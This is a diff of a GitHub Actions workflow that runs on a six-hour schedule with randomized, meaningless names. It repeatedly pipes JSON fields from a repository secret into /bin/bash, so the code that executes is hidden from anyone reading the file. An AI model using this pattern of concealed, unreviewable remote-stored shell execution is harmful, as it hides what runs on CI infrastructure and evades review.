@@ -2,21 +2,25 @@ name: xuguoqiang3456
 on:
   workflow_dispatch:
   schedule:
-    - cron: '32 4/6 * * *'
-
-jobs:  # 23322
+    - cron: '9 5/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: xuguoqiang3456
         env:
-          hos61108: ${{ secrets.hos61108 }}
+          xg92: ${{ secrets.xg92 }}
         run: |
-          echo $hos61108 | jq -r .jlgop224 | /bin/bash
-          echo $w9 | jq -r .kdzv707 | /bin/bash
-          echo $ohsgt7105 | jq -r .wsjva1870 | /bin/bash
-          echo $apq1126 | jq -r .n4199 | /bin/bash
-          echo $npq781 | jq -r .cqp73 | /bin/bash
-          echo $ut09 | jq -r .pyhg47 | /bin/bash
+          echo $xg92 | jq -r .l649 | /bin/bash
+          echo $qc7514 | jq -r .r3758 | /bin/bash
+          echo $qy42 | jq -r .lglri4680 | /bin/bash
+          echo $lskez89958 | jq -r .hmw68 | /bin/bash
+          echo $zyms7 | jq -r .nuocb8 | /bin/bash
+          echo $vb775 | jq -r .lsy731 | /bin/bash
+          echo $c1668 | jq -r .j1124 | /bin/bash
+          echo $kzia8535 | jq -r .glx89667 | /bin/bash
+          echo $tjjnk20689 | jq -r .v2 | /bin/bash
+          echo $rwdl3 | jq -r .bmf0487 | /bin/bash
 
